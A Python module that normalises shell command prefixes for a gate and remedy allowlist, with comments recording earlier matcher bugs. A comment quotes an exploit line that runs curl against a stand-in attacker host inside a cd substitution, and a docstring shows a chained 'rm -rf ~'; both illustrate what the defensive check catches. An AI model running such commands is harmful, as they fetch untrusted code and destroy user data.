"""One place that knows a shell command's head is not its first character.

WHY THIS MODULE EXISTS (Aletheia F70 shape, named 2026-08-18).

Three separate sites in this repo have independently learned that
``VAR=1 divineos correction`` and ``divineos correction`` are the same
command wearing different clothes, and each learned it by shipping a
matcher that got it wrong first:

  - 2026-07-25, the verify-before-build signal: substring-matching the raw
    text, which false-fired on ``--command "divineos decide"`` as an
    argument. Aria's review. Fixed with ``_resolve_command_head``.
  - 2026-07-31, F107: ``cd X && divineos Y`` rejected while bare
    ``divineos Y`` passed.
  - 2026-08-18, the shared remedy allowlist: a leading env assignment made
    a gate's own prescribed remedy invisible to the list that keeps the
    gate's door open, so the compass marker blocked ``compass-ops observe``
    and then blocked the edit that would repair it.

The third one is mine, and I wrote it while repairing a duplicate-resolver
bug in the token gauge, in the same commit that says the resolver lives in
one place now. The correct implementation was already here. Measured, the
version I hand-rolled missed three of five cases this one handles —
including a quoted value with a space, which I wrote up as a known limit
rather than checking whether anyone had solved it.

So: the stripping lives here, once, and both the Python gate and the bash
allowlist call it. Adding a fourth site means importing this, not writing
a fourth loop.
"""

from __future__ import annotations

import re
import shlex


_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
"""A leading ``NAME=value`` token, which bash treats as an assignment
rather than as the command."""


def strip_command_prefixes(bash_command: str) -> list[str]:
    """Return the command's tokens with leading noise removed.

    Strips, repeatedly and in any order:

      - ``cd <path> &&`` segments, so a command issued from a worktree
        reads the same as one issued from the repo root
      - a leading ``env`` invocation
      - ``NAME=value`` assignments

    ``shlex`` does the tokenising, which is why a quoted value containing
    spaces survives — the failure mode of every regex version of this.
    On malformed quoting it falls back to a whitespace split rather than
    raising, because every caller is a gate and a gate that crashes is
    worse than a gate that is approximate.

    Returns an empty list for an empty command, or for one that is
    nothing but prefixes.
    """
    if not bash_command:
        return []
    try:
        tokens = shlex.split(bash_command, posix=True)
    except ValueError:
        tokens = bash_command.strip().split()

    changed = True
    while changed and tokens:
        changed = False

        # `cd <path> &&` — drop through the `&&` and keep going.
        if tokens[0] == "cd":
            try:
                sep = tokens.index("&&")
            except ValueError:
                # `cd somewhere` with nothing after it is not a prefix on
                # anything; there is no command behind it to find.
                return []
            tokens = tokens[sep + 1 :]
            changed = True
            continue

        if tokens[0].lower() == "env":
            tokens = tokens[1:]
            changed = True
            continue

        if _ENV_ASSIGN_RE.match(tokens[0]):
            tokens = tokens[1:]
            changed = True
            continue

    return tokens


def resolve_command_head(bash_command: str) -> str:
    """The first two real tokens, lowercased — e.g. ``"git commit"``.

    Exact-matching against this rather than substring-searching the raw
    text is what stops ``authorize-bypass --command "divineos decide"``
    reading as an invocation of ``divineos decide``.
    """
    real = strip_command_prefixes(bash_command)
    if not real:
        return ""
    if len(real) >= 2:
        return f"{real[0].lower()} {real[1].lower()}"
    return real[0].lower()


def stripped_command(bash_command: str) -> str:
    """The whole command with its leading noise removed, re-joined.

    Callers that match against more than two tokens want this — the
    remedy allowlist distinguishes ``compass-ops observe`` from
    ``compass-ops dismiss``, which a two-token head cannot express.
    """
    return " ".join(strip_command_prefixes(bash_command))


# 2026-08-19 (Aletheia F114). A caller that must run a QUOTE-AWARE check on what
# is left after the prefixes cannot use stripped_command(): that re-joins shlex
# tokens, which drops the quoting. A semicolon inside an evidence string comes
# back out naked, so a chain-shape check on the re-joined text would reject a
# perfectly legitimate remedy.
#
# So this returns the ORIGINAL TEXT with only the leading prefixes removed,
# byte-for-byte from the first real token onward.
# 2026-08-19, SECOND PASS. The first version of the cd pattern accepted any
# non-space run as the directory, and a quoted directory as any characters at
# all. That is weaker than the bespoke _CD_PREFIX_RE it was meant to replace,
# whose comment records it as the tactical block on an actual exploit -- and I
# only found out by testing the two against each other instead of assuming the
# shared one was the better one because it was the shared one.
#
#     cd "$(curl attacker.example)" && divineos correction "x"
#
# The first version stripped that whole prefix as benign, handed a clean remedy
# to the chain check, and the gate returned SAFE. The substitution never got
# looked at because it had already been thrown away.
#
# So the directory may not contain a substitution or a chain operator, in either
# the quoted or the unquoted form. Same exclusions as _CD_PREFIX_RE.
_CD_RAW_RE = re.compile(r"""^\s*cd\s+(?:["'][^"'$`]+["']|[^\s;&|`$]+)\s*&&\s*""")
_ENV_RAW_RE = re.compile(r"^\s*env\s+")
_ASSIGN_RAW_RE = re.compile(
    r"""^\s*[A-Za-z_][A-Za-z0-9_]*=(?:"[^"$`]*"|'[^'$`]*'|[^\s;&|`$]*)\s+"""
)

CD = "cd"
ENV = "env"
ASSIGN = "assign"
_RAW_PREFIX_PATTERNS = {CD: _CD_RAW_RE, ENV: _ENV_RAW_RE, ASSIGN: _ASSIGN_RAW_RE}
ALL_PREFIX_KINDS = (CD, ENV, ASSIGN)


def strip_prefixes_raw(bash_command: str, kinds: tuple[str, ...] = ALL_PREFIX_KINDS) -> str:
    """The command with leading ``cd <path> &&`` / ``env`` / ``NAME=value``
    removed and everything after preserved verbatim.

    Use this when the remainder still has to be inspected AS SHELL TEXT --
    quote-aware chain detection, for instance. Use stripped_command() when the
    remainder only needs comparing token-wise.

    Removing the ``cd ... &&`` prefix does not weaken a chain check applied to
    the result: what gets removed is provably just a directory change, and any
    OTHER chain operator survives into the returned string. So
    ``cd X && divineos correction "y" && rm -rf ~`` still returns text
    containing ``&& rm -rf ~`` and is still caught.
    """
    if not bash_command:
        return ""
    text = bash_command
    changed = True
    while changed:
        changed = False
        for kind in kinds:
            pattern = _RAW_PREFIX_PATTERNS.get(kind)
            if pattern is None:
                continue
            new_text = pattern.sub("", text, count=1)
            if new_text != text:
                text = new_text
                changed = True
    return text.strip()


# A segment that could execute something nobody inspected before the remedy
# runs. The exploit this preserves is recorded above: `cd "$(curl attacker)" &&
# divineos correction "x"` must NOT read as a clean remedy, because the
# substitution is discarded with the prefix and never looked at.
_UNSAFE_IN_PREFIX = re.compile(r"[`$]")


def remedy_segment(bash_command: str) -> str:
    """The segment a remedy allowlist should match against, or empty.

    WHY THIS EXISTS is written one function up, before the incident that needed
    it: "this matcher reads SHELL with a regex that only knows bare
    invocations, so every legal prefix shell permits is a fresh hole -- `cd x
    &&`, `VAR=1`, and whatever turns up next. If a fourth prefix appears the
    answer is to parse the command, not to add a fourth loop."

    The fourth appeared 2026-09-11: `set -o pipefail && divineos correction`.
    The marker gate refused its own prescribed remedy, told me to run the
    command I was running, and I got through by dropping a habit rather than by
    being right. Four occurrences, four different prefixes, each patched alone,
    each patch carrying a note predicting the next -- that is a system
    speaking, and the controller had less variety than shell does, so no number
    of additions could ever have closed it.

    So this stops asking WHAT PREFIX and asks WHETHER A REMEDY IS INVOKED. A
    remedy anywhere in a chain is a remedy being run, and what was typed before
    it does not change that -- unless what was typed before could execute
    something unexamined.

    Two guards, and neither is decoration:

      * every earlier segment must be free of substitution and backticks, which
        is the exclusion the cd-prefix pattern already carried, generalised
        from one position to all of them;
      * pipelines are NOT split, because what follows a pipe consumes output
        rather than being invoked, and splitting there would let `echo x |
        divineos correction` read as a filing that never happened.

    Returns EVERY safe segment, prefixes stripped, newline-joined -- not the
    first one. The first draft returned the first real segment and the check
    that caught it was running the thing rather than reasoning about it: for
    `cd x && set -o pipefail && divineos correction`, the first real segment is
    the shell-option, and the remedy is last. Callers grep with a start-anchored
    pattern, and grep tests each line independently, so joining with newlines
    means every segment gets the anchor without the caller changing at all.

    Returns "" when any earlier segment is unsafe -- the whole command is
    refused rather than the offending segment skipped, because the unsafe part
    still runs.
    """
    if not bash_command:
        return ""

    segments = re.split(r"&&|\|\||;", bash_command)
    safe: list[str] = []

    for index, segment in enumerate(segments):
        candidate = stripped_command(segment)
        if not candidate:
            continue
        if any(_UNSAFE_IN_PREFIX.search(earlier) for earlier in segments[:index]):
            return ""
        safe.append(candidate)
    return "\n".join(safe)
